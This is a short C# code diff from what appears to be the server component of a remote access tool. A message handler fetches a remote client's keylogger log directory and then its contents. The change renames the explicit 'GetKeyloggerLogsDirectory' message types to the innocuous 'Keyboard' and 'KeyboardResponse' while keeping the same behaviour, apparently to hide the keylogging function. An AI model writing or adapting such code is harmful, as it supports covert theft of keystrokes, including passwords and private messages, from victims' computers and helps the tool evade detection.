@@ -55,7 +55,7 @@ namespace Rouzzf.Server.Messages
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;
+        public override bool CanExecute(IMessage message) => message is KeyboardResponse;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -65,7 +65,7 @@ namespace Rouzzf.Server.Messages
         {
             switch (message)
             {
-                case GetKeyloggerLogsDirectoryResponse logsDirectory:
+                case KeyboardResponse logsDirectory:
                     Execute(sender, logsDirectory);
                     break;
             }
@@ -76,10 +76,10 @@ namespace Rouzzf.Server.Messages
         /// </summary>
         public void RetrieveLogs()
         {
-            _client.Send(new GetKeyloggerLogsDirectory());
+            _client.Send(new Keyboard());
         }
 
-        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
+        private void Execute(ISender client, KeyboardResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory;
             client.Send(new GetDirectory {RemotePath = _remoteKeyloggerDirectory});
